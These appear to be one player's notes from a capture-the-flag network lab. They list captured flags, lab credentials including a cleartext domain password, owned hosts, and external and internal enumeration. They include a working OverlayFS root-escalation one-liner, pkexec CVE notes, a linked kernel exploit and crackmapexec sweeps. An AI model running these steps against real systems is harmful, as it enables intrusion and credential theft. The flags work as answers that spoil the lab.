# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings
### Credentials
` riley : P@ssw0rd `
DB: ` riley : PainterDBPassword2022`

### Flags
1. `ZEPHYR{HuM4n_3rr0r_1s_0uR_D0wnf4ll}`
2. `ZEPHYR{S3rV1c3_AcC0Un7_5PN_Tr0uBl35}`
3. `ZEPHYR{PwN1nG_W17h_P4s5W0rd_R3U53}`
4. `ZEPHYR{P3r5isT4nc3_1s_k3Y_4_M0v3men7}`
5. `ZEPHYR{P41n73r_D0m41n_D0m1n4nc3}`
6. `ZEPHYR{L34v3_N0_St0n3_Un7urN3d}`
7. `ZEPHYR{34t1ng_7h3_B0n3s_0f_N3tw0rks}`
8. `ZEPHYR{SQLi_2_Imp3rs0n4710n_fun}`
9. `ZEPHYR{34t1ng_7h3_B0n3s_0f_N3tw0rks}`
10. `ZEPHYR{K3y_Cr3d3n714l_l1nk_d4ng3r}`
11. `ZEPHYR{C4n7_F0rg3t_ab0u7_7h1s_0n3}`
12. `ZEPHYR{In73rn4l_D0m41n_D0m1n473d}`
13. `ZEPHYR{C0n57r4in3d_d3l3g4710n_1s_d4ng3r0us}`
14. `ZEPHYR{7h3_Tru57_h45_B3eN_Br0k3n}`
15. `ZEPHYR{Abu51ng_d3f4ul7_Func710n4li7y_ftw}`
16. `ZEPHYR{G0tt4_l1nk_Up_4m_1_r1gh7?}`
17. `ZEPHYR{S3rv1c3_M4n4g3m3nt_f41L5}`
18. `ZEPHYR{D0n7_f0rg3t_Imp0rt4nt_Inf0rm4710n}`

### Machines
1. [[PNT - DC01]]
2. [[PNT - SVRSVC]]
3. [[PNT - SVRBPA]]
4. [[WORKSTATION-1]]
5. [[PNT - SVRPSB]]
6. [[ZPH - SVRDC01]] - Skipped
7. [[ZPH - SVRCA01]] - Skipped
8. [[ZPH - SVRADFS1]] - Skipped
9. [[ZPH-SVRMGMT1]] - Skipped
10. [[ZPH - SVRSQL01]] - Skipped
11. [[ZPH - SVRCDC01]]
12. [[ZEPHYR-SQL02]]
13. [[ZEPHYR-HR]]
14. [[ZEPHYR-SUPPORT]]
15. [[ZEPHYR-ZABBIX]]
16. ZEPHYR-WKST
17. 
## External
### Enumeration
![](https://i.imgur.com/ecJojky.png)
`mail.painters.htb  192.168.110.51`
- users
	- Toby Harlington
	- James Ray
	- Thomas Bishop
	- Mary Brabbs
	- Christopher Parker
	- Ralph Davies
![](https://i.imgur.com/snDYmIO.png)
![](https://i.imgur.com/dcKLQo2.png)
`?id=1`
![](https://i.imgur.com/7Jha53C.png)
```shell
# The Text from the site

All applications will be reviewed by our staff on a first come first serve basis so please be patient as there may be a delay in responses.
```
- This means if i did some kind of injections then i can get reverse thing, but the reverse thing is hard to get so, the most likely thing is to get XSS cookie.
![](https://i.imgur.com/MxBMdnS.png)
![](https://i.imgur.com/3Eani5j.png)
![](https://i.imgur.com/fx5ThiU.png)
- But idk which payload made this request
![](https://i.imgur.com/kgt8gUu.png)
- `User-Agent: Mozilla/3.0 (compatible; Acrobat Annots 23.6.20380 )`
- I tried to check metasploit malicious pdfs if it generates and i found this
![](https://i.imgur.com/UpZ3ZHB.png)
![](https://i.imgur.com/WV9Q7yC.png)
![](https://i.imgur.com/5KxB2ZP.png)
### Gaining Access
![](https://i.imgur.com/GuztZoq.png)
![](https://i.imgur.com/QuYde7c.png)
![](https://i.imgur.com/DigMjPA.png)
## Internal
### Enumeration
![](https://i.imgur.com/7NmVys3.png)
![](https://i.imgur.com/eRhnSEr.png)

```
/etc/postfix
/etc/postfix/master.cf

-rwsr-xr-x 1 root root 31K Feb 21  2022 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)


sudoedit -s Y

tmux -S /tmp/tmux-1003
/var/log/nginx/access.log
logrotate 3.14.0

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes

update users SET password='$2a$12$DPjQY/ojg5j61WGzIifEEekBzeWytzg5RlPLOYexWfZxSK3fhI5Zi' where USER='admin';

2024/06/27 07:51:38 CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity
2024/06/27 07:51:38 CMD: UID=0     PID=91686  |
2024/06/27 08:00:01 CMD: UID=0     PID=91691  | /usr/sbin/CRON -f
2024/06/27 08:00:01 CMD: UID=0     PID=91692  | /bin/sh -c /bin/bash -c /root/scripts/restore.sh
2024/06/27 08:00:01 CMD: UID=0     PID=91694  |
2024/06/27 08:00:01 CMD: UID=0     PID=91693  | /bin/bash /root/scripts/restore.sh
2024/06/27 08:03:13 CMD: UID=0     PID=91695  |
```
![](https://i.imgur.com/lqGvaLD.png)
```shell
define("DB_HOST", "localhost");
define("DB_NAME", "painter");
define("DB_CHARSET", "utf8");
define("DB_USER", "riley");
define("DB_PASSWORD", "PainterDBPassword2022");
```
![](https://i.imgur.com/eguLdlC.png)

![](https://i.imgur.com/t1Lk7Rj.png)
![](https://i.imgur.com/E9k0Olz.png)
```shell
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\"cp /home/blake/Maildir /home/riley/.rexder\")'";rm -rf l u w m
```
![](https://i.imgur.com/M24sBF6.png)
- The kernel is vulnerable but i dont have gcc to compile the exploit.
	- https://github.com/briskets/CVE-2021-3493/blob/main/exploit.c
> BLAKE 
> Matt has sudo access

![](https://i.imgur.com/Gb5qw2d.png)
![](https://i.imgur.com/dHdAhV3.png)
![](https://i.imgur.com/uL1LCjf.png)

![](https://i.imgur.com/Nh3XAFN.png)
- So i tried to login with it - `PASSWORD REUSE`
- ![](https://i.imgur.com/jtrBv8h.png)

### Gaining Access
![](https://i.imgur.com/U6vYGNj.png)

```shell
~/C/H/P/zephyr > 10.10.14.3 $ fping -asgq 192.168.110.0/24
192.168.110.1
192.168.110.55  <- OWNED
192.168.110.51 <- process
192.168.110.54  <- OWNED
192.168.110.53 <- OWNED
192.168.110.52  <- OWNED
192.168.110.56 <- OWNED

~/C/H/P/zephyr > 10.10.14.3 $ crackmapexec smb 192.168.110.0/24
SMB         192.168.110.55  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:painters.htb) (signing:True) (SMBv1:False)
SMB         192.168.110.52  445    PNT-SVRSVC       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRSVC) (domain:painters.htb) (signing:False) (SMBv1:False)
SMB         192.168.110.53  445    PNT-SVRBPA       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRBPA) (domain:painters.htb) (signing:False) (SMBv1:False)

```
### Maintaining Access
- After i Compromised the DOmain [[PNT - DC01]] - i got matts password
![](https://i.imgur.com/w0Wuc8A.png)
- `painters.htb\Matt:CLEARTEXT:L1f30f4Spr1ngCh1ck3n!`
![](https://i.imgur.com/hVivRBl.png)
![](https://i.imgur.com/ISCd4KF.png)

# Random Notes